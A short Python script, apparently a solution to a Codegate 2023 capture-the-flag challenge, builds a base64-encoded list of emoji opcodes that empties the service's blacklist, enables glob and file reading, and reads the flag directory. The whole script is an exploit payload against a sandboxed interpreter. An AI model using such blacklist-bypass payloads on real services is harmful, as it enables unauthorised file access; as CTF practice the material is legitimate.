import json
import base64

instrs = []

def makeInstr(opcode,operands):
    instrs.append({"opcode": opcode,"operands": operands})

# setup blacklist and file_options
makeInstr("😀",[[]])
makeInstr("😂",["blacklist"])
makeInstr("😀",[["glob","read_text"]])
makeInstr("😂",["file_options"])

# use glob to list directory contents, then read flag
makeInstr("😀",[1])
makeInstr("😀",["/home/ctf/codegate2023-read-plz"])

makeInstr("🧠",[])

makeInstr("✓",[])

print(base64.b64encode(json.dumps(instrs).encode()).decode())
